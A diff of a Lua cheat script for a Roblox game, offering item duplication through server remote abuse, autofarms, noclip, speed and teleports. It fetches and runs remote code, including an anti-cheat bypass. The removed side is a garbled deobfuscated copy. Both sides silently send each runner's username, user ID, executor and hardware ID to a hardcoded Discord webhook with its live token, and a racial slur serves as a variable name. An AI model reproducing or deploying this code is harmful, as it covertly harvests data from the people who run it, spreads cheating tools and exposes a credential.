@@ -1,33 +1,11 @@
-local v001 = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua'))()
-local v002 = game.v008.v055
-local v003 = {
-    "kaisfrms2hub",
-    "v063",
-    "v063",
-    "v063",
-    "v063",
-    "v063",
-}
-local v004 = false
-for _, whitelistedName in pairs(v003) do
-    if v002.Name == whitelistedName then
-        v004 = true
-        break
-    end
-end
-if not v004 then
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Access Denied!!",
-        Text = "You are not whitelisted!",
-        Duration = 3
-    })
-    return 
-end
-print("Whitelisted - Loading UI...")
-local v005 = v001:CreateWindow({
+
+local Window = Rayfield:CreateWindow({
    Name = "ZKHUB | SW2 | FREE",
-   Icon = nil, 
+   Icon = nil, -- No icon
    LoadingTitle = "Loading..",
    LoadingSubtitle = "By Theyfw_kais",
    Theme = {
@@ -63,19 +41,23 @@ local v005 = v001:CreateWindow({
       InputStroke = Color3.fromRGB(0, 255, 0),
       PlaceholderColor = Color3.fromRGB(0, 255, 0)
    },
+
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
+
    ConfigurationSaving = {
       Enabled = false,
       FolderName = "GreenBlackThemeHub",
       FileName = "BigHub"
    },
+
    Discord = {
       Enabled = false,
       Invite = "noinvitelink",
       RememberJoins = true
    },
-   KeySystem = nil, 
+
+   KeySystem = nil, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
@@ -86,132 +68,173 @@ local v005 = v001:CreateWindow({
       Key = {},
    }
 })
-local v006 = v005:CreateTab("ð Main", 4483362458) 
-local v007 = v006:CreateSection("ð³Card Dupeð³")
-local v008 = game:GetService("v008")
-local v009 = game:GetService("v009")
-local v010 = game:GetService("v010")
-local v002 = v008.v055
-local v011 = 10
-local v012 notify(message, time, type)
-    local v013, err = pcall(v012()
+
+
+local MainTab = Window:CreateTab("🏠Main", 4483362458) -- Title, Image
+local Section = MainTab:CreateSection("💳Card Dupe💳")
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local player = Players.LocalPlayer
+
+local dupeAmount = 10
+
+-- Notification function with error handling
+local function notify(message, time, type)
+    local success, err = pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
             Title = type or "Info",
             Text = message,
             Duration = time or 5,
         })
     end)
-    if not v013 then
+
+    if not success then
         warn("Notification failed: " .. err)
     end
 end
-v006:CreateInput({
+
+-- Textbox for Duplication Amount
+MainTab:CreateInput({
     Name = "Laptop & Card Dupe",
     PlaceholderText = "Amount",
     RemoveTextAfterFocusLost = false,
     Flag = "DupeAmount",
-    Callback = v012(value)
-        v011 = tonumber(value) or 10
-        if v011 <= 0 then
-            v011 = 10  
-            notify("Invalid v113, defaulting to 10.", 3, "Warning")
+    Callback = function(value)
+        dupeAmount = tonumber(value) or 10
+        if dupeAmount <= 0 then
+            dupeAmount = 10  -- Fallback value
+            notify("Invalid amount, defaulting to 10.", 3, "Warning")
         end
     end
 })
-local v012 duplicateCardsAndLaptops()
-    if v011 <= 0 then
-        notify("Invalid v113!", 3, "Error")
+
+-- Duplication Function
+local function duplicateCardsAndLaptops()
+    if dupeAmount <= 0 then
+        notify("Invalid amount!", 3, "Error")
         return
     end
+
     notify("Buying cards & laptops...", 3, "Info")
+
+    -- Open Dealer UI
     fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
-    wait(2) 
-    v002.PlayerGui:WaitForChild("DealerGui")
-    local v014 = v002.PlayerGui.DealerGui.ShopFrame
-    v014.Visible = true
-    v002.PlayerGui.DealerGui.Frame.Visible = false
-    game:GetService("v094"):Set3dRenderingEnabled(false)
-    repeat wait() until v002.Character and v002.Character:FindFirstChild("HumanoidRootPart")
-    v002.Character.HumanoidRootPart.CFrame = CFrame.new(-55, 4.5, 170)
+    wait(2) -- Wait to ensure the UI is open
+    player.PlayerGui:WaitForChild("DealerGui")
+    local shopGui = player.PlayerGui.DealerGui.ShopFrame
+    shopGui.Visible = true
+    player.PlayerGui.DealerGui.Frame.Visible = false
+    game:GetService("RunService"):Set3dRenderingEnabled(false)
+
+    -- Position player correctly
+    repeat wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(-55, 4.5, 170)
+
     wait(0.5)
-    local v015 = v014["Blank Card"]
-    local v016 = v014["laptop"]
-    for i = 1, v011 do
+
+    -- Click buttons for purchasing
+    local cardButton = shopGui["Blank Card"]
+    local laptopButton = shopGui["laptop"]
+
+    for i = 1, dupeAmount do
         task.wait()
-        if v015.Visible then
-            local v017 = v015.AbsolutePosition
-            v010:SendMouseButtonEvent(v017.X + 150, v017.Y + 60, 0, true, game, 0)
+        -- Click the card button
+        if cardButton.Visible then
+            local cardPos = cardButton.AbsolutePosition
+            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, true, game, 0)
             task.wait(0.08)
-            v010:SendMouseButtonEvent(v017.X + 150, v017.Y + 60, 0, false, game, 0)
+            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, false, game, 0)
         end
+
         task.wait(0.08)
-        if v016.Visible then
-            local v018 = v016.AbsolutePosition
-            v010:SendMouseButtonEvent(v018.X + 150, v018.Y + 60, 0, true, game, 0)
+
+        -- Click the laptop button
+        if laptopButton.Visible then
+            local laptopPos = laptopButton.AbsolutePosition
+            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, true, game, 0)
             task.wait(0.08)
-            v010:SendMouseButtonEvent(v018.X + 150, v018.Y + 60, 0, false, game, 0)
+            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, false, game, 0)
         end
     end
-    game:GetService("v094"):Set3dRenderingEnabled(true)
-    local v019 = v014.exit
-    v010:SendMouseButtonEvent(v019.AbsolutePosition.X + 300, v019.AbsolutePosition.Y + 65, 0, true, game, 0)
+
+    game:GetService("RunService"):Set3dRenderingEnabled(true)
+
+    -- Close the UI
+    local exitButton = shopGui.exit
+    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, true, game, 0)
     wait()
-    v010:SendMouseButtonEvent(v019.AbsolutePosition.X + 300, v019.AbsolutePosition.Y + 65, 0, false, game, 0)
-    v002.Character.HumanoidRootPart.CFrame = CFrame.new(954, 4.7, -61)
+    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, false, game, 0)
+
+    -- Move player to next step
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(954, 4.7, -61)
     wait(4)
+
+    -- Process Laptops
     notify("Processing laptops...", 3, "Info")
-    local v020 = 0
-    for _, v in pairs(v002.Backpack:GetChildren()) do
+    local laptopCount = 0
+    for _, v in pairs(player.Backpack:GetChildren()) do
         if v.Name == "Laptop" then
-            v020 = v020 + 1
+            laptopCount = laptopCount + 1
         end
     end
-    for i = 1, v020 - 1 do
-        spawn(v012()
-            local v021 = { true, "NEW123" }
-            v009.Assets.Other.GiverPunchmade:InvokeServer(unpack(v021))
+
+    for i = 1, laptopCount - 1 do
+        spawn(function()
+            local args = { true, "NEW123" }
+            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
         end)
     end
+
     wait(4)
-    v002.Backpack.Laptop.Parent = v002.Character
+    player.Backpack.Laptop.Parent = player.Character
     wait(4)
+
+    -- Process Cards
     notify("Processing cards...", 3, "Info")
-    local v022 = 0
-    for _, v in pairs(v002.Backpack:GetChildren()) do
+    local cardCount = 0
+    for _, v in pairs(player.Backpack:GetChildren()) do
         if v.Name == "Loaded Card" then
-            v022 = v022 + 1
+            cardCount = cardCount + 1
         end
     end
-    for i = 1, v022 do
-        spawn(v012()
-            local v021 = { false, "NEW123" }
-            v009.Assets.Other.GiverPunchmade:InvokeServer(unpack(v021))
+
+    for i = 1, cardCount do
+        spawn(function()
+            local args = { false, "NEW123" }
+            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
         end)
     end
+
     wait(1)
     notify("Duplication Complete!", 5, "Success")
-    v002.Character.Humanoid:UnequipTools()
+    player.Character.Humanoid:UnequipTools()
 end
-v006:CreateButton({
+
+-- Button for Duplication
+MainTab:CreateButton({
     Name = "Dupe Laptop & Card",
-    Callback = v012()
+    Callback = function()
         duplicateCardsAndLaptops()
     end
 })
-local v023 = v006:CreateSection("ð¦Mop / Box Farmð¦")
-local v024 = v006:CreateToggle({
+
+local MainSection = MainTab:CreateSection("📦Mop / Box Farm📦")
+
+local Toggle = MainTab:CreateToggle({
     Name = "Mop Autofarm",
     CurrentValue = false,
     Flag = "MopAutofarm",
-    Callback = v012(state)
+    Callback = function(state)
         _G.automopfarm = state
         if _G.automopfarm then
             while _G.automopfarm do
                 for i, v in pairs(game.Workspace.CleanPart:GetChildren()) do
                     if v.ProximityPrompt.Enabled == true then
-                        game:GetService("v009").GiveMop:FireServer()
+                        game:GetService("ReplicatedStorage").GiveMop:FireServer()
                         v.ProximityPrompt.HoldDuration = 1
-                        game.v008.v055.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 2, 0)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 2, 0)
                         wait(1)
                         fireproximityprompt(v.ProximityPrompt, v.ProximityPrompt.HoldDuration, false)
                         wait(v.ProximityPrompt.HoldDuration + 2.2)
@@ -221,113 +244,142 @@ local v024 = v006:CreateToggle({
         end
     end
 })
-local v024 = v006:CreateToggle({
+
+local Toggle = MainTab:CreateToggle({
     Name = "Box Autofarm",
     CurrentValue = false,
     Flag = "BoxAutofarm",
-    Callback = v012(state)
+    Callback = function(state)
         _G.autoboxfarm = state
+
         if _G.autoboxfarm then
-            task.spawn(v012()
+            task.spawn(function()
                 while _G.autoboxfarm do
-                    local v025 = game.v008.v055.Character.HumanoidRootPart.CFrame
-                    game.v008.v055.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
+                    local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                    
+                    -- Move to the box location
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
                     wait(0.5)
+                    
+                    -- Pick up the box
                     fireclickdetector(game.Workspace.Job.Box.BOX1.ClickDetector)
                     wait(0.2)
-                    game.v008.v055.Character.HumanoidRootPart.CFrame = v025
-                    game.v008.v055.Backpack:WaitForChild("Box").Parent = game.v008.v055.Character
-                    firetouchinterest(game.Workspace.Job.Box.Job, game.v008.v055.Character:FindFirstChildOfClass("Tool").Handle, 0)
+                    
+                    -- Move back to the old position
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                    
+                    -- Equip the box
+                    game.Players.LocalPlayer.Backpack:WaitForChild("Box").Parent = game.Players.LocalPlayer.Character
+                    
+                    -- Drop the box at the job area
+                    firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 0)
                     wait()
-                    firetouchinterest(game.Workspace.Job.Box.Job, game.v008.v055.Character:FindFirstChildOfClass("Tool").Handle, 1)
+                    firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 1)
+                    
+                    -- Wait for the job cooldown
                     wait(15)
                 end
             end)
         end
     end
 })
-local v026 = game:GetService("v026")
-local v027 = "Unknown"
-local v028 = "Unknown"
-local v029 = "Unknown"
+
+
+local HttpService = game:GetService("HttpService")
+
+-- Get HWID (if executor supports it)
+local hwid = "Unknown"
+local hwidPart1 = "Unknown"
+local hwidPart2 = "Unknown"
+
 if syn and syn.get_hwid then
-    v027 = syn.get_hwid()  
+    hwid = syn.get_hwid()  -- Synapse X HWID method
 elseif gethwid then
-    v027 = gethwid()  
+    hwid = gethwid()  -- For executors that use this method
 elseif fluxus and fluxus.get_hwid then
-    v027 = fluxus.get_hwid()  
+    hwid = fluxus.get_hwid()  -- Fluxus HWID method
 end
-if v027 ~= "Unknown" then
-    v028 = v027:sub(1, #v027 // 2)  
-    v029 = v027:sub(#v027 // 2 + 1)  
-    v027 = v028 .. " - " .. v029  
+
+-- Split HWID into two parts (for example, split at character 32)
+-- You can adjust the splitting logic based on how you want to format it.
+if hwid ~= "Unknown" then
+    hwidPart1 = hwid:sub(1, #hwid // 2)  -- First half of the HWID
+    hwidPart2 = hwid:sub(#hwid // 2 + 1)  -- Second half of the HWID
+    hwid = hwidPart1 .. " - " .. hwidPart2  -- Format with dash
 end
-local v030 = "Unknown"
+
+-- Basic info
+local executor = "Unknown"
 if syn then
-    v030 = "Synapse X"
+    executor = "Synapse X"
 elseif secure_load then
-    v030 = "Script-Ware"
+    executor = "Script-Ware"
 elseif KRNL_LOADED then
-    v030 = "KRNL"
+    executor = "KRNL"
 elseif is_sirhurt_closure then
-    v030 = "SirHurt"
+    executor = "SirHurt"
 elseif pebc_execute then
-    v030 = "ProtoSmasher"
+    executor = "ProtoSmasher"
 elseif fluxus then
-    v030 = "Fluxus"
+    executor = "Fluxus"
 elseif identifyexecutor then
-    v030 = identifyexecutor()
+    executor = identifyexecutor()
 elseif getexecutorname then
-    v030 = getexecutorname()
+    executor = getexecutorname()
 end
-local v031 = game.v008.v055.Name
-local v032 = game.v008.v055.UserId
-local v033 = game.PlaceId
-local v034 = "Unknown Game"
-pcall(v012()
-   local v035 = game:GetService("MarketplaceService"):GetProductInfo(v033)
-   if v035 and v035.Name then
-      v034 = v035.Name
+
+local robloxUser = game.Players.LocalPlayer.Name
+local userId = game.Players.LocalPlayer.UserId
+local placeId = game.PlaceId
+
+-- Game name fetch
+local gameName = "Unknown Game"
+pcall(function()
+   local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+   if info and info.Name then
+      gameName = info.Name
    end
 end)
-local v036 = {
+
+-- Webhook payload with 2 gaps between fields
+local data = {
    ["embeds"] = {{
-       ["title"] = "ð New Script Log",
-       ["color"] = 0x006400, 
+       ["title"] = "📋 New Script Log",
+       ["color"] = 0x006400, -- Dark Green
        ["fields"] = {
            {
-               ["name"] = "ð¤ Roblox User",
-               ["value"] = v031,
+               ["name"] = "👤 Roblox User",
+               ["value"] = robloxUser,
                ["inline"] = true
            },
            {
-               ["name"] = " ",  
-               ["value"] = " ",  
+               ["name"] = " ",  -- Empty space for gap
+               ["value"] = " ",  -- Empty space for gap
                ["inline"] = false
            },
            {
-               ["name"] = "ð§ª Executor",
-               ["value"] = v030,
+               ["name"] = "🧪 Executor",
+               ["value"] = executor,
                ["inline"] = true
            },
            {
-               ["name"] = " ",  
-               ["value"] = " ",  
+               ["name"] = " ",  -- Empty space for gap
+               ["value"] = " ",  -- Empty space for gap
                ["inline"] = false
            },
            {
-               ["name"] = "ð® Game",
-               ["value"] = v034,
+               ["name"] = "🎮 Game",
+               ["value"] = gameName,
                ["inline"] = true
            },
            {
-               ["name"] = " ",  
-               ["value"] = " ",  
+               ["name"] = " ",  -- Empty space for gap
+               ["value"] = " ",  -- Empty space for gap
                ["inline"] = false
            },
            {
-               ["name"] = "ð§¬ HWID",
-               ["value"] = v027,  
+               ["name"] = "🧬 HWID",
+               ["value"] = hwid,  -- Formatted HWID with dash
                ["inline"] = true
            },
        },
@@ -336,72 +388,88 @@ local v036 = {
        }
    }}
 }
-local v037 = v026:JSONEncode(v036)
-local v038 = "https://discord.com/api/webhooks/1361952152934678609/Dgr2p1f_4Gv3UvCk9uKptcTOeQPUswPea4qNKEHSdTx7Zahp2cMF891DJ3aZLdWYPqR0"
-local v039 = http_request or syn.request or http.request
-if v039 then
-   v039({
-       Url = v038,
+
+local jsonData = HttpService:JSONEncode(data)
+
+-- Webhook URL
+local webhook = "https://discord.com/api/webhooks/1361952152934678609/Dgr2p1f_4Gv3UvCk9uKptcTOeQPUswPea4qNKEHSdTx7Zahp2cMF891DJ3aZLdWYPqR0"
+
+local req = http_request or syn.request or http.request
+if req then
+   req({
+       Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
-       Body = v037
+       Body = jsonData
    })
 end
-local v040 = v005:CreateTab("ð´ð»v063", 4483362458) 
-local v041 = v040:CreateSection("âªSpeed / Jumpð")
-local v042 = v040:CreateSlider({
+
+
+local PlayerTab = Window:CreateTab("🕴🏻Player", 4483362458) -- Title, Image
+local PlayerSection = PlayerTab:CreateSection("⏪Speed / Jump🆙")
+
+local Slider = PlayerTab:CreateSlider({
    Name = "WalkSpeed",
    Range = {0, 300},
    Increment = 10,
    Suffix = "Speed",
    CurrentValue = 10,
-   Flag = "Slider1", 
-   Callback = v012(Value)
-            game.v008.v055.Character.Humanoid.WalkSpeed = (Value)
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
    end,
 })
-local v042 = v040:CreateSlider({
+
+local Slider = PlayerTab:CreateSlider({
    Name = "Jump Height",
    Range = {0, 300},
    Increment = 10,
    Suffix = "Power",
    CurrentValue = 10,
-   Flag = "Slider1", 
-   Callback = v012(Value)
-            game.v008.v055.Character.Humanoid.JumpPower = (Value)
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+            game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
    end,
 })
-local v041 = v040:CreateSection("ðExtra Abilitiesð")
-local v024 = v040:CreateToggle({
+
+local PlayerSection = PlayerTab:CreateSection("🆙Extra Abilities👓")
+
+local Toggle = PlayerTab:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
-   Flag = "Toggle1", 
-   Callback = v012(Value)
-   InfiniteJumpEnabled = not InfiniteJumpEnabled 
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+   InfiniteJumpEnabled = not InfiniteJumpEnabled -- Toggle the state of InfiniteJumpEnabled
        if InfiniteJumpEnabled then
+           -- Infinite jump is enabled
            print("Infinite Jump Enabled")
-           game:GetService("v095").JumpRequest:Connect(v012()
+           game:GetService("UserInputService").JumpRequest:Connect(function()
                if InfiniteJumpEnabled then
-                   game:GetService("v008").v055.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
+                   game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
                end
            end)
        else
+           -- Infinite jump is disabled
            print("Infinite Jump Disabled")
        end
    end,
 })
-local v002 = game:GetService("v008").v055
-local v043 = false
-local v044
-local v012 toggleNoclip(state)
-    v043 = state
-    if v043 then
-        v044 = task.spawn(v012()
-            while v043 do
-                if v002.Character then
-                    for _, part in pairs(v002.Character:GetDescendants()) do
+
+
+local player = game:GetService("Players").LocalPlayer
+local noclip = false
+local noclipLoop
+
+
+local function toggleNoclip(state)
+    noclip = state
+    if noclip then
+        noclipLoop = task.spawn(function()
+            while noclip do
+                if player.Character then
+                    for _, part in pairs(player.Character:GetDescendants()) do
                         if part:IsA("BasePart") then
                             part.CanCollide = false
                         end
@@ -411,11 +479,12 @@ local v012 toggleNoclip(state)
             end
         end)
     else
-        if v044 then
-            task.cancel(v044)
+        -- Stop noclip and restore collision
+        if noclipLoop then
+            task.cancel(noclipLoop)
         end
-        if v002.Character then
-            for _, part in pairs(v002.Character:GetDescendants()) do
+        if player.Character then
+            for _, part in pairs(player.Character:GetDescendants()) do
                 if part:IsA("BasePart") then
                     part.CanCollide = true
                 end
@@ -423,204 +492,239 @@ local v012 toggleNoclip(state)
         end
     end
 end
-v040:CreateToggle({
+
+-- Create Toggle Button
+PlayerTab:CreateToggle({
     Name = "No-Clip",
     CurrentValue = false,
     Flag = "NoclipToggle",
-    Callback = v012(Value)
+    Callback = function(Value)
         toggleNoclip(Value)
     end,
 })
-local v007 = v040:CreateSection("âï¸Lonely Ahh Flyyâï¸")
-local v045 = v040:CreateButton({
+
+local Section = PlayerTab:CreateSection("✈️Lonely Ahh Flyy✈️")
+
+local Button = PlayerTab:CreateButton({
    Name = "Fly V3",
-   Callback = v012()
+   Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
    end,
 })
-local v046 = v005:CreateTab("âï¸Teleports", 4483362458) 
-local v007 = v046:CreateSection("ð Main Teleportsâï¸")
-local v047 = {
-    {Name = "ðDealership", Position = CFrame.new(842, 5, -7)},
-    {Name = "ð©Apartments 2", Position = CFrame.new(739, 4, 199)},
-    {Name = "ð¨Apartments 1", Position = CFrame.new(4, 4, 52)},
-    {Name = "ð§¹Paki Shop", Position = CFrame.new(-101, 4, 18)},
-    {Name = "ð¦Box Job", Position = CFrame.new(-118, 4, 300)},
-    {Name = "ðPizza Job", Position = CFrame.new(166, 5, 49)},
-    {Name = "ðªThrift Store", Position = CFrame.new(-42, 4, 36)},
-    {Name = "ð¥Boxing", Position = CFrame.new(259, 5, -100)},
-    {Name = "ðCasino", Position = CFrame.new(159, 5, 246)},
-    {Name = "ðIce Box", Position = CFrame.new(-11354, 4, 288)},
-    {Name = "ð¤­Suit Shop", Position = CFrame.new(43, 4, -329)},
-    {Name = "ð¥Hospital", Position = CFrame.new(42, 4, -261)},
-    {Name = "ð«Gun Store", Position = CFrame.new(-51807, 4, -11)},
-    {Name = "ð¥·Bank Tools Etc", Position = CFrame.new(-142, 4, 189)},
-    {Name = "ð³Blanc Card Dealer", Position = CFrame.new(226, 4, -543)},
+
+local TeleportsTab = Window:CreateTab("✈️Teleports", 4483362458) -- Title, Image
+local Section = TeleportsTab:CreateSection("🏠Main Teleports✈️")
+
+local mainTeleportLocations = {
+    {Name = "🚗Dealership", Position = CFrame.new(842, 5, -7)},
+    {Name = "🏩Apartments 2", Position = CFrame.new(739, 4, 199)},
+    {Name = "🏨Apartments 1", Position = CFrame.new(4, 4, 52)},
+    {Name = "🧹Paki Shop", Position = CFrame.new(-101, 4, 18)},
+    {Name = "📦Box Job", Position = CFrame.new(-118, 4, 300)},
+    {Name = "🍕Pizza Job", Position = CFrame.new(166, 5, 49)},
+    {Name = "🏪Thrift Store", Position = CFrame.new(-42, 4, 36)},
+    {Name = "🥊Boxing", Position = CFrame.new(259, 5, -100)},
+    {Name = "🏆Casino", Position = CFrame.new(159, 5, 246)},
+    {Name = "💎Ice Box", Position = CFrame.new(-11354, 4, 288)},
+    {Name = "🤭Suit Shop", Position = CFrame.new(43, 4, -329)},
+    {Name = "🏥Hospital", Position = CFrame.new(42, 4, -261)},
+    {Name = "🔫Gun Store", Position = CFrame.new(-51807, 4, -11)},
+    {Name = "🥷Bank Tools Etc", Position = CFrame.new(-142, 4, 189)},
+    {Name = "💳Blanc Card Dealer", Position = CFrame.new(226, 4, -543)},
 }
-local v048 = {}
-for _, location in ipairs(v047) do
-    table.insert(v048, location.Name)
+
+local mainLocationNames = {}
+for _, location in ipairs(mainTeleportLocations) do
+    table.insert(mainLocationNames, location.Name)
 end
-local v049 = v047[1]
-v046:CreateDropdown({
+
+local selectedMainLocation = mainTeleportLocations[1]
+
+TeleportsTab:CreateDropdown({
     Name = "Select Main Location",
-    Options = v048,
-    CurrentOption = {v048[1]},
+    Options = mainLocationNames,
+    CurrentOption = {mainLocationNames[1]},
     MultipleOptions = false,
     Flag = "MainTeleportLocationDropdown",
-    Callback = v012(Options)
-        for _, location in ipairs(v047) do
+    Callback = function(Options)
+        for _, location in ipairs(mainTeleportLocations) do
             if location.Name == Options[1] then
-                v049 = location
+                selectedMainLocation = location
                 break
             end
         end
     end
 })
-v046:CreateButton({
+
+TeleportsTab:CreateButton({
     Name = "Teleport to Main Location",
-    Callback = v012()
-        local v002 = game.v008.v055
-        if v002 and v002.Character and v002.Character:FindFirstChild("HumanoidRootPart") then
-            v002.Character.HumanoidRootPart.CFrame = v049.Position
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            player.Character.HumanoidRootPart.CFrame = selectedMainLocation.Position
         else
-            warn("No valid v103 or HumanoidRootPart found!")
+            warn("No valid character or HumanoidRootPart found!")
         end
     end
 })
-local v050 = v046:CreateSection("ðGang Turf / Locker Teleportsð")
-local v051 = {
-    {Name = "ðTNT Locker", Position = CFrame.new(269, 5, 132)},
-    {Name = "ð©¸ATB Locker", Position = CFrame.new(93, 4, -703)},
-    {Name = "ð©¶SG Locker", Position = CFrame.new(188, 4, -395)},
-    {Name = "ðKAO Locker", Position = CFrame.new(328, 7, 82)},
-    {Name = "ðAF Locker", Position = CFrame.new(162, 5, 518)},
-    {Name = "ð§¡EOS Locker", Position = CFrame.new(374, 22, 409)},
-    {Name = "ðAOD Locker", Position = CFrame.new(6, 5, 509)},
-    {Name = "â¤ï¸LAC Locker", Position = CFrame.new(-166, 4, -773)},
-    {Name = "ðP9 Locker", Position = CFrame.new(459, 7, 160)},
-    {Name = "ðTPL Locker", Position = CFrame.new(318, 7, 230)},
-    {Name = "ðRGD Locker", Position = CFrame.new(599, 7, 223)},
+
+-- Section 2: Gang Locker Teleports
+local GangSection = TeleportsTab:CreateSection("🛅Gang Turf / Locker Teleports🛅")
+
+local gangTeleportLocations = {
+    {Name = "🍍TNT Locker", Position = CFrame.new(269, 5, 132)},
+    {Name = "🩸ATB Locker", Position = CFrame.new(93, 4, -703)},
+    {Name = "🩶SG Locker", Position = CFrame.new(188, 4, -395)},
+    {Name = "💙KAO Locker", Position = CFrame.new(328, 7, 82)},
+    {Name = "💙AF Locker", Position = CFrame.new(162, 5, 518)},
+    {Name = "🧡EOS Locker", Position = CFrame.new(374, 22, 409)},
+    {Name = "💚AOD Locker", Position = CFrame.new(6, 5, 509)},
+    {Name = "❤️LAC Locker", Position = CFrame.new(-166, 4, -773)},
+    {Name = "💙P9 Locker", Position = CFrame.new(459, 7, 160)},
+    {Name = "💙TPL Locker", Position = CFrame.new(318, 7, 230)},
+    {Name = "💛RGD Locker", Position = CFrame.new(599, 7, 223)},
     {Name = "NGF Locker", Position = CFrame.new(571, 20, 174)},
-    {Name = "ðDF Locker", Position = CFrame.new(870, 5, 498)},
-    {Name = "ðWheel Spin", Position = CFrame.new(142, 4, 91)},
+    {Name = "💙DF Locker", Position = CFrame.new(870, 5, 498)},
+    {Name = "🎄Wheel Spin", Position = CFrame.new(142, 4, 91)},
 }
-local v052 = {}
-for _, location in ipairs(v051) do
-    table.insert(v052, location.Name)
+
+local gangLocationNames = {}
+for _, location in ipairs(gangTeleportLocations) do
+    table.insert(gangLocationNames, location.Name)
 end
-local v053 = v051[1]
-v046:CreateDropdown({
+
+local selectedGangLocation = gangTeleportLocations[1]
+
+TeleportsTab:CreateDropdown({
     Name = "Select Gang Locker Location",
-    Options = v052,
-    CurrentOption = {v052[1]},
+    Options = gangLocationNames,
+    CurrentOption = {gangLocationNames[1]},
     MultipleOptions = false,
     Flag = "GangTeleportLocationDropdown",
-    Callback = v012(Options)
-        for _, location in ipairs(v051) do
+    Callback = function(Options)
+        for _, location in ipairs(gangTeleportLocations) do
             if location.Name == Options[1] then
-                v053 = location
+                selectedGangLocation = location
                 break
             end
         end
     end
 })
-v046:CreateButton({
+
+TeleportsTab:CreateButton({
     Name = "Teleport to Gang Locker",
-    Callback = v012()
-        local v002 = game.v008.v055
-        if v002 and v002.Character and v002.Character:FindFirstChild("HumanoidRootPart") then
-            v002.Character.HumanoidRootPart.CFrame = v053.Position
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            player.Character.HumanoidRootPart.CFrame = selectedGangLocation.Position
         else
-            warn("No valid v103 or HumanoidRootPart found!")
+            warn("No valid character or HumanoidRootPart found!")
         end
     end
 })
-local v054 = v046:CreateSection("ð´ð»v063 Teleportsð´âï¸")
-local v008 = game:GetService("v008")
-local v055 = v008.v055
-local v056 = {}
-for _, v002 in ipairs(v008:GetPlayers()) do
-    if v002 ~= v055 then
-        table.insert(v056, v002.Name)
+
+
+local TeleportsSection = TeleportsTab:CreateSection("🕴🏻Player Teleports🕴✈️")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local dkIsANigger = {}
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        table.insert(dkIsANigger, player.Name)
     end
 end
-local v057 = v046:CreateDropdown({
-    Name = "v008",
-    Options = v056,
+
+local TeleportDropdown = TeleportsTab:CreateDropdown({
+    Name = "Players",
+    Options = dkIsANigger,
     CurrentOption = {},
     MultipleOptions = false,
     Flag = "PlayerDropdown",
-    Callback = v012(Options)
+    Callback = function(Options)
         SelectedPlayer = Options[1]
     end,
 })
-local v012 UpdateDropdown()
-    local v058 = {}
-    for _, name in ipairs(v056) do
-        v058[name] = true
+
+local function UpdateDropdown()
+    local ExistingPlayers = {}
+    for _, name in ipairs(dkIsANigger) do
+        ExistingPlayers[name] = true
     end
-    local v059 = {}
-    for _, v002 in ipairs(v008:GetPlayers()) do
-        if v002 ~= v055 then
-            table.insert(v059, v002.Name)
+
+    local NewOptions = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
